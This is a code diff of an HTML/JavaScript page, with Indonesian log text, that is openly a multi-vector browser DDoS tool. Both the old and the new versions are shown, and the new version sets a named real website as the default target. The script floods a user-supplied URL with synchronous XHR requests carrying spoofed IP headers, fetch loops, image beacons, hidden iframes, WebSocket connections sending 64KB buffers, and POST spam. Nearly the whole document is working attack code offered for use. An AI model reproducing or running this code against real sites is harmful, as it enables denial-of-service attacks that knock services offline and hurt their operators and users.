@@ -2,192 +2,504 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BRUTAL L7 DDOS - MULTI VECTOR</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>TERMINAL DDOS - MULTI ENGINE</title>
     <style>
-        body { background: #000; color: #ff0000; font-family: monospace; padding: 20px; }
-        input, button { background: #1a0000; color: #ff0000; border: 1px solid #ff0000; padding: 10px; margin: 5px; font-weight: bold; }
-        .log { background: #0a0000; height: 400px; overflow-y: scroll; font-size: 11px; margin-top: 15px; padding: 8px; border: 2px solid #ff0000; }
-        h2 { color: #ff0000; text-shadow: 0 0 5px red; }
-        button:hover { background: #ff0000; color: #000; cursor: pointer; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+        }
+
+        body {
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
+            font-family: 'Courier New', 'Fira Code', monospace;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .terminal {
+            background: #000000dd;
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            border: 1px solid #ff3300;
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
+            width: 900px;
+            max-width: 100%;
+            overflow: hidden;
+        }
+
+        .terminal-header {
+            background: #1a0000;
+            padding: 15px 20px;
+            border-bottom: 2px solid #ff3300;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .title {
+            color: #ff3300;
+            font-weight: bold;
+            font-size: 1.2rem;
+            text-shadow: 0 0 5px #ff0000;
+        }
+
+        .status {
+            color: #00ff00;
+            font-size: 0.8rem;
+        }
+
+        .control-panel {
+            padding: 20px;
+            background: #0a0a0a;
+            border-bottom: 1px solid #ff3300;
+        }
+
+        input, button {
+            background: #000;
+            border: 1px solid #ff3300;
+            color: #ff3300;
+            padding: 10px 15px;
+            font-family: monospace;
+            font-size: 14px;
+            margin: 5px;
+            transition: all 0.3s;
+        }
+
+        input {
+            width: calc(100% - 20px);
+            background: #0a0a0a;
+        }
+
+        button {
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        button:hover {
+            background: #ff3300;
+            color: #000;
+            box-shadow: 0 0 15px #ff3300;
+        }
+
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+
+        .stat-card {
+            background: #000000aa;
+            border: 1px solid #ff3300;
+            padding: 15px;
+            text-align: center;
+            border-radius: 10px;
+        }
+
+        .stat-value {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #ff3300;
+        }
+
+        .log-area {
+            background: #000;
+            height: 300px;
+            overflow-y: auto;
+            padding: 15px;
+            font-size: 12px;
+            font-family: monospace;
+            border-top: 1px solid #ff3300;
+        }
+
+        .log-entry {
+            color: #00ff00;
+            margin: 3px 0;
+            border-left: 2px solid #ff3300;
+            padding-left: 10px;
+        }
+
+        .log-error {
+            color: #ff3300;
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: #000;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #ff3300;
+        }
+
+        .warning {
+            color: #ffaa00;
+            font-size: 11px;
+            margin-top: 10px;
+            text-align: center;
+        }
     </style>
 </head>
 <body>
-<h2>🔥 EXTREME MULTI-THREAD HTTP/1.1 + HTTP/2 + WS + XMLHttpRequest FLOOD 🔥</h2>
-<label>Target URL:</label><br>
-<input type="text" id="targetUrl" placeholder="https://example.com" style="width: 80%;">
-<button id="startBtn">💀 START TOTAL ANNIHILATION 💀</button>
-<button id="stopBtn">✋ STOP</button>
-<div class="log" id="log"></div>
+<div class="terminal">
+    <div class="terminal-header">
+        <span class="title">🔥 DDOS MULTI-ENGINE TERMINAL v3.7 🔥</span>
+        <span class="status" id="systemStatus">● SYSTEM ARMED</span>
+    </div>
+    
+    <div class="control-panel">
+        <input type="text" id="targetInput" placeholder="https://target-website.com" value="https://violetics.pw">
+        <br>
+        <button id="startBtn">💀 EXECUTE FLOOD 💀</button>
+        <button id="stopBtn">⛔ TERMINATE</button>
+        
+        <div class="stats" style="margin-top: 20px;">
+            <div class="stat-card">
+                <div>💥 REQUESTS</div>
+                <div class="stat-value" id="reqCount">0</div>
+            </div>
+            <div class="stat-card">
+                <div>⚠️ ERRORS</div>
+                <div class="stat-value" id="errCount">0</div>
+            </div>
+            <div class="stat-card">
+                <div>⚡ RATE/sec</div>
+                <div class="stat-value" id="rateCount">0</div>
+            </div>
+        </div>
+        
+        <div class="warning">
+            ⚡ MULTI-VECTOR: HTTP/2 | WebSocket | XHR Sync | Image Beacon | iFrame Injection ⚡
+        </div>
+    </div>
+    
+    <div class="log-area" id="logArea">
+        <div class="log-entry">[READY] Masukkan target dan tekan EXECUTE</div>
+        <div class="log-entry">[INFO] Sistem menggunakan 6 metode serangan simultan</div>
+    </div>
+</div>
+
 <script>
-    let active = false;
-    let threads = 500;
-    let reqCount = 0;
-    let errCount = 0;
-    let wsConnections = [];
-
-    function log(msg) {
-        const div = document.getElementById('log');
-        div.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
-        div.scrollTop = div.scrollHeight;
-    }
-
-    // XHR synchronous blocking + async flood (legacy but heavy)
-    function xhrFlood(url, id) {
-        while(active) {
-            for(let i=0; i<20; i++) { // batch 20 request per loop
-                if(!active) break;
-                const xhr = new XMLHttpRequest();
-                const randomUrl = url + '/' + Math.random().toString(36) + '?t=' + Date.now() + '_' + id + '_' + i;
-                try {
-                    xhr.open('GET', randomUrl, false); // synchronous = blokir event loop tapi brutal ke target
-                    xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
-                    xhr.setRequestHeader('X-Forwarded-For', Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255)+'.'+Math.floor(Math.random()*255));
-                    xhr.send();
-                    reqCount++;
-                    if(reqCount % 100 === 0) log(`[XHR-${id}] Req: ${reqCount} | Status: ${xhr.status}`);
-                } catch(e) {
-                    errCount++;
-                    if(errCount % 50 === 0) log(`[XHR-ERROR] ${e.message}`);
+    (function() {
+        // ========== KONFIGURASI ==========
+        let active = false;
+        let requestCount = 0;
+        let errorCount = 0;
+        let startTime = 0;
+        let workerThreads = [];
+        let wsConnections = [];
+        let intervalId = null;
+        
+        // DOM elements
+        const targetInput = document.getElementById('targetInput');
+        const startBtn = document.getElementById('startBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const reqCountEl = document.getElementById('reqCount');
+        const errCountEl = document.getElementById('errCount');
+        const rateCountEl = document.getElementById('rateCount');
+        const logArea = document.getElementById('logArea');
+        const systemStatus = document.getElementById('systemStatus');
+        
+        // ========== UTILITY FUNCTIONS ==========
+        function addLog(msg, isError = false) {
+            const logDiv = document.createElement('div');
+            logDiv.className = isError ? 'log-entry log-error' : 'log-entry';
+            const timestamp = new Date().toLocaleTimeString();
+            logDiv.innerHTML = `[${timestamp}] ${msg}`;
+            logArea.appendChild(logDiv);
+            logDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+            
+            // Limit log entries to 500
+            while(logArea.children.length > 500) {
+                logArea.removeChild(logArea.firstChild);
+            }
+        }
+        
+        function normalizeUrl(url) {
+            url = url.trim();
+            if(!url) return null;
+            if(!url.startsWith('http')) {
+                url = 'https://' + url;
+            }
+            return url;
+        }
+        
+        function updateStats() {
+            reqCountEl.innerText = requestCount.toLocaleString();
+            errCountEl.innerText = errorCount.toLocaleString();
+            if(startTime > 0 && active) {
+                const elapsed = (Date.now() - startTime) / 1000;
+                const rate = Math.floor(requestCount / elapsed);
+                rateCountEl.innerText = rate.toLocaleString();
+            } else {
+                rateCountEl.innerText = '0';
+            }
+        }
+        
+        // ========== SERANGAN METHOD 1: XHR SYNCHRONOUS (BLOCKING) ==========
+        function xhrFlood(url, workerId) {
+            while(active) {
+                // Batch 30 XHR per loop
+                for(let batch = 0; batch < 30 && active; batch++) {
+                    const randomPath = '/' + Math.random().toString(36).substring(2, 10) + '?' + Date.now() + '_' + workerId + '_' + batch;
+                    const fullUrl = url + randomPath;
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('GET', fullUrl, false); // Synchronous = brutal
+                        xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
+                        xhr.setRequestHeader('X-Forwarded-For', Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255) + '.' + Math.floor(Math.random()*255));
+                        xhr.setRequestHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+                        xhr.setRequestHeader('Pragma', 'no-cache');
+                        xhr.timeout = 3000;
+                        xhr.send();
+                        requestCount++;
+                        if(requestCount % 100 === 0) updateStats();
+                    } catch(e) {
+                        errorCount++;
+                        if(errorCount % 50 === 0) addLog(`[XHR-${workerId}] Error: ${e.message}`, true);
+                    }
+                }
+                // Micro delay to prevent browser freeze completely
+                if(active) {
+                    const start = Date.now();
+                    while(Date.now() - start < 1) {} // Minimal blocking
                 }
             }
         }
-    }
-
-    // Fetch + keep-alive + no delay
-    async function fetchFlood(url, id) {
-        while(active) {
-            const randomPath = '/' + Math.random().toString(36).substring(2) + '?' + Date.now() + '_' + id;
-            const fullUrl = url + randomPath;
-            const headers = {
-                'User-Agent': 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
-                'Cache-Control': 'no-store, no-cache, max-age=0',
-                'Pragma': 'no-cache',
-                'X-Spoof-IP': Math.floor(Math.random()*4294967295),
-                'Accept': '*/*',
-                'Connection': 'keep-alive',
-                'X-Requested-With': 'XMLHttpRequest'
-            };
-            try {
-                const res = await fetch(fullUrl, { method: 'GET', headers, mode: 'cors', credentials: 'include', keepalive: true });
-                reqCount++;
-                if(reqCount % 50 === 0) log(`[FETCH-${id}] ${res.status} | Total req: ${reqCount}`);
-                await res.text().catch(()=>{});
-            } catch(e) {
-                errCount++;
-            }
-        }
-    }
-
-    // WebSocket bomb (jika support)
-    function wsBomb(url, id) {
-        let wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
-        function createWS() {
-            if(!active) return;
-            try {
-                const ws = new WebSocket(wsUrl);
-                wsConnections.push(ws);
-                ws.onopen = () => {
-                    setInterval(() => {
-                        if(ws.readyState === WebSocket.OPEN && active) {
-                            ws.send(new ArrayBuffer(1024 * 64)); // 64KB binary setiap 10ms
-                            reqCount++;
-                        }
-                    }, 10);
-                };
-                ws.onclose = () => setTimeout(createWS, 1);
-                ws.onerror = () => ws.close();
-            } catch(e) {}
-        }
-        for(let i=0; i<50; i++) createWS(); // 50 websocket persistent
-    }
-
-    // Image beacon bomb (via Image object)
-    function imgFlood(url, id) {
-        while(active) {
-            const img = new Image();
-            const randUrl = url + '/img_' + Math.random() + '.jpg?' + Date.now() + '_' + id;
-            img.src = randUrl;
-            reqCount++;
-            if(reqCount % 200 === 0) log(`[IMG-${id}] Beacon sent`);
-        }
-    }
-
-    // iframe injection ke DOM (membebani memory target)
-    function iframeOverload(url) {
-        const iframeContainer = document.createElement('div');
-        iframeContainer.style.display = 'none';
-        document.body.appendChild(iframeContainer);
-        setInterval(() => {
-            if(!active) return;
-            for(let i=0;i<30;i++) {
-                const iframe = document.createElement('iframe');
-                iframe.src = url + '?' + Math.random();
-                iframeContainer.appendChild(iframe);
-                setTimeout(() => iframe.remove(), 100);
-                reqCount++;
-            }
-        }, 100);
-    }
-
-    function startTotalFlood() {
-        let target = document.getElementById('targetUrl').value.trim();
-        if(!target) {
-            alert("Masukkan URL target!");
-            return;
-        }
-        if(!target.startsWith('http')) target = 'https://' + target;
-        if(active) {
-            log("Already active. Stop first.");
-            return;
-        }
-        active = true;
-        reqCount = 0;
-        errCount = 0;
-        log(`💀💀💀 STARTING BRUTAL DDOS ON: ${target} 💀💀💀`);
-        log(`Threads: ${threads} | Method: XHR sync + Fetch async + WebSocket + Image + iframe`);
-
-        // Launch XHR synchronous threads (paling heavy)
-        for(let i=0; i<200; i++) {
-            setTimeout(() => xhrFlood(target, i), i*2);
-        }
-        // Launch fetch async threads
-        for(let i=0; i<200; i++) {
-            setTimeout(() => fetchFlood(target, i+200), i*2);
-        }
-        // Image bomb threads
-        for(let i=0; i<80; i++) {
-            setTimeout(() => imgFlood(target, i+400), i*5);
-        }
-        // WebSocket bomb
-        wsBomb(target, 0);
-        // iframe overload
-        iframeOverload(target);
         
-        log("✅ ALL ENGINES ACTIVE - WebSocket, XHR sync, fetch, Image beacon, iframe injection");
-        setInterval(() => {
-            if(active) log(`📊 STATS - Total Requests: ${reqCount} | Errors: ${errCount} | Rate: ${Math.floor(reqCount/ ((Date.now() - startTime)/1000))}/sec`);
-        }, 5000);
-    }
-
-    function stopFlood() {
-        active = false;
-        wsConnections.forEach(ws => { try{ws.close()}catch(e){} });
-        wsConnections = [];
-        log(`🛑 STOPPED. Total requests: ${reqCount} | Errors: ${errCount}`);
-    }
-
-    let startTime;
-    const originalStart = startTotalFlood;
-    startTotalFlood = function() {
-        startTime = Date.now();
-        originalStart();
-    };
-
-    document.getElementById('startBtn').onclick = startTotalFlood;
-    document.getElementById('stopBtn').onclick = stopFlood;
-    log("READY. Masukkan target (contoh: https://target.com) lalu klik TOTAL ANNIHILATION.");
-    log("⚠️ INI BRUTAL - XHR SYNC MEMBLOKIR TAB BROWSER ANDA, TETAPI JUGA MEMBUNUH SERVER TARGET.");
+        // ========== METHOD 2: FETCH ASYNC + KEEPALIVE ==========
+        async function fetchFlood(url, workerId) {
+            while(active) {
+                const randomPath = '/' + Math.random().toString(36).substring(2, 15) + '?' + Date.now() + '_' + workerId;
+                const fullUrl = url + randomPath;
+                const headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+                    'Accept-Language': 'id,en-US;q=0.7,en;q=0.3',
+                    'Cache-Control': 'no-store, no-cache, max-age=0',
+                    'X-Spoof-IP': Math.floor(Math.random() * 4294967295).toString(),
+                    'Connection': 'keep-alive'
+                };
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 2000);
+                    const res = await fetch(fullUrl, { 
+                        method: 'GET', 
+                        headers: headers, 
+                        signal: controller.signal,
+                        mode: 'cors',
+                        credentials: 'include',
+                        keepalive: true
+                    });
+                    clearTimeout(timeoutId);
+                    requestCount++;
+                    if(requestCount % 150 === 0) updateStats();
+                    await res.text().catch(()=>{});
+                } catch(e) {
+                    errorCount++;
+                }
+            }
+        }
+        
+        // ========== METHOD 3: IMAGE BEACON BOMB ==========
+        function imageFlood(url, workerId) {
+            while(active) {
+                const img = new Image();
+                const randUrl = url + '/img_' + Math.random().toString(36) + '.jpg?' + Date.now() + '_' + workerId;
+                img.src = randUrl;
+                requestCount++;
+                if(requestCount % 200 === 0) updateStats();
+            }
+        }
+        
+        // ========== METHOD 4: IFRAME INJECTION ==========
+        let iframeContainer = null;
+        function iframeOverload(url) {
+            if(!iframeContainer) {
+                iframeContainer = document.createElement('div');
+                iframeContainer.style.display = 'none';
+                document.body.appendChild(iframeContainer);
+            }
+            setInterval(() => {
+                if(!active) return;
+                for(let i = 0; i < 20 && active; i++) {
+                    const iframe = document.createElement('iframe');
+                    iframe.src = url + '?' + Math.random() + '_' + Date.now();
+                    iframe.style.display = 'none';
+                    iframeContainer.appendChild(iframe);
+                    requestCount++;
+                    setTimeout(() => iframe.remove(), 50);
+                }
+                updateStats();
+            }, 50);
+        }
+        
+        // ========== METHOD 5: WEB SOCKET BOMB ==========
+        function wsBomb(url) {
+            let wsUrl = url.replace('https://', 'wss://').replace('http://', 'ws://');
+            function createWS() {
+                if(!active) return;
+                try {
+                    const ws = new WebSocket(wsUrl);
+                    wsConnections.push(ws);
+                    ws.onopen = () => {
+                        const interval = setInterval(() => {
+                            if(ws.readyState === WebSocket.OPEN && active) {
+                                ws.send(new ArrayBuffer(1024 * 64));
+                                requestCount++;
+                                updateStats();
+                            } else if(!active) {
+                                clearInterval(interval);
+                            }
+                        }, 10);
+                        ws.onclose = () => clearInterval(interval);
+                    };
+                    ws.onerror = () => ws.close();
+                    ws.onclose = () => setTimeout(createWS, 5);
+                } catch(e) {
+                    errorCount++;
+                }
+            }
+            for(let i = 0; i < 30; i++) {
+                setTimeout(createWS, i * 10);
+            }
+        }
+        
+        // ========== METHOD 6: POST FORM SPAM ==========
+        async function postSpam(url, workerId) {
+            while(active) {
+                const formData = new FormData();
+                formData.append('data', Math.random().toString(36).repeat(100));
+                formData.append('spam', 'x'.repeat(5000));
+                try {
+                    await fetch(url, {
+                        method: 'POST',
+                        body: formData,
+                        mode: 'cors',
+                        headers: {
+                            'Content-Type': 'multipart/form-data',
+                            'X-Spam': Date.now().toString()
+                        }
+                    });
+                    requestCount++;
+                    updateStats();
+                } catch(e) {
+                    errorCount++;
+                }
+            }
+        }
+        
+        // ========== START ALL ENGINES ==========
+        function startDDoS() {
+            let target = normalizeUrl(targetInput.value);
+            if(!target) {
+                addLog('[ERROR] Target URL tidak valid!', true);
+                return;
+            }
+            
+            if(active) {
+                addLog('[WARNING] Serangan sudah berjalan. Stop dulu.', true);
+                return;
+            }
+            
+            active = true;
+            requestCount = 0;
+            errorCount = 0;
+            startTime = Date.now();
+            systemStatus.innerHTML = '● ATTACK ACTIVE';
+            systemStatus.style.color = '#ff0000';
+            
+            addLog(`🔥🔥🔥 MEMULAI SERANGAN MULTI-VECTOR KE: ${target} 🔥🔥🔥`);
+            addLog(`[INFO] Metode: XHR Sync | Fetch Async | Image Beacon | iFrame | WebSocket | POST Spam`);
+            
+            // Launch 150 XHR threads (paling brutal)
+            for(let i = 0; i < 150; i++) {
+                setTimeout(() => xhrFlood(target, i), i * 2);
+            }
+            
+            // Launch 100 Fetch threads
+            for(let i = 0; i < 100; i++) {
+                setTimeout(() => fetchFlood(target, i+150), i * 3);
+            }
+            
+            // Launch 50 Image threads
+            for(let i = 0; i < 50; i++) {
+                setTimeout(() => imageFlood(target, i+250), i * 5);
+            }
+            
+            // Launch 30 POST spam
+            for(let i = 0; i < 30; i++) {
+                setTimeout(() => postSpam(target, i+300), i * 10);
+            }
+            
+            // WebSocket & iframe (separate)
+            setTimeout(() => wsBomb(target), 100);
+            setTimeout(() => iframeOverload(target), 200);
+            
+            // Status updater
+            if(intervalId) clearInterval(intervalId);
+            intervalId = setInterval(() => {
+                if(active) {
+                    updateStats();
+                    if(requestCount % 500 === 0 && requestCount > 0) {
+                        addLog(`[STATUS] ${requestCount.toLocaleString()} request terkirim | Error: ${errorCount}`);
+                    }
+                }
+            }, 2000);
+            
+            addLog('✅ SEMUA ENGINE AKTIF - Target akan mengalami delay ekstrim');
+        }
+        
+        // ========== STOP ==========
+        function stopDDoS() {
+            if(!active) {
+                addLog('[INFO] Tidak ada serangan aktif', false);
+                return;
+            }
+            
+            active = false;
+            systemStatus.innerHTML = '● SYSTEM ARMED';
+            systemStatus.style.color = '#00ff00';
+            
+            // Tutup semua WebSocket
+            wsConnections.forEach(ws => {
+                try { ws.close(); } catch(e) {}
+            });
+            wsConnections = [];
+            
+            if(iframeContainer) {
+                iframeContainer.innerHTML = '';
+            }
+            
+            if(intervalId) {
+                clearInterval(intervalId);
+                intervalId = null;
+            }
+            
+            const elapsed = (Date.now() - startTime) / 1000;
+            const avgRate = Math.floor(requestCount / elapsed);
+            addLog(`⛔ SERANGAN DIHENTIKAN ⛔`);
+            addLog(`📊 STATISTIK FINAL: ${requestCount.toLocaleString()} request dalam ${elapsed.toFixed(1)} detik`);
+            addLog(`📊 Rata-rata rate: ${avgRate.toLocaleString()} request/detik | Error: ${errorCount}`);
+            updateStats();
+        }
+        
+        // Event listeners
+        startBtn.onclick = startDDoS;
+        stopBtn.onclick = stopDDoS;
+        
+        addLog('[SYSTEM] Terminal siap. Target default: https://violetics.pw');
+        addLog('[PERINGATAN] Serangan ini memerlukan koneksi internet stabil');
+    })();
 </script>
 </body>
-</html>
+    </html>
